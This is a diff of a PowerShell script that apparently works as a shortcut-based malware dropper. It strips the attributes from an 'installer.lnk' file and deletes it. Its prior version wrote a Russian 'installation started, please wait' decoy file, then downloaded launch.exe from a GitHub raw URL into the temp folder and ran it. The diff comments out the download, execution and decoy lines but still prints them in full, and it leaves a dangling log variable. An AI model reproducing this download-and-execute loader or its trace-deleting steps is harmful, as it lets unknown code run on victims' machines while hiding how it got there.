@@ -12,33 +12,22 @@ $folder = (Get-Location).Path
 
 $lnk = Join-Path $folder "installer.lnk"
 $txt = Join-Path $folder "installer.txt"
-$log = Join-Path $env:TEMP "my_log222.txt"
 
-Start-Sleep -Seconds 2
+Start-Sleep -Seconds 1
 
 Add-Content $log "Пытаюсь удалить: $lnk"
 
 if (Test-Path $lnk) {
-    # attrib -r -s -h $lnk
-    # [System.IO.File]::Delete($lnk)
-
-    try {
-        attrib -r -s -h $lnk 2>$null
-        Remove-Item $lnk -Force -ErrorAction Stop
-        Add-Content $log "Файл успешно удалён."
-    } catch {
-        Add-Content $log "Не удалось удалить: $_"
-    }
-} else {
-    Add-Content $log "Файл не найден по указанному пути."
+    attrib -r -s -h $lnk
+    [System.IO.File]::Delete($lnk)
 }
 
-@"
-Установка запущена.
+# @"
+# Установка запущена.
 
-Пожалуйста, подождите...
-"@ | Out-File $txt -Encoding UTF8
+# Пожалуйста, подождите...
+# "@ | Out-File $txt -Encoding UTF8
 
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile('https://raw.githubusercontent.com/nesabydy00/dgeagagaeg/main/launch.exe', "$env:TEMP\a.exe")
-& "$env:TEMP\a.exe"
+# $wc = New-Object System.Net.WebClient
+# $wc.DownloadFile('https://raw.githubusercontent.com/nesabydy00/dgeagagaeg/main/launch.exe', "$env:TEMP\a.exe")
+# & "$env:TEMP\a.exe"
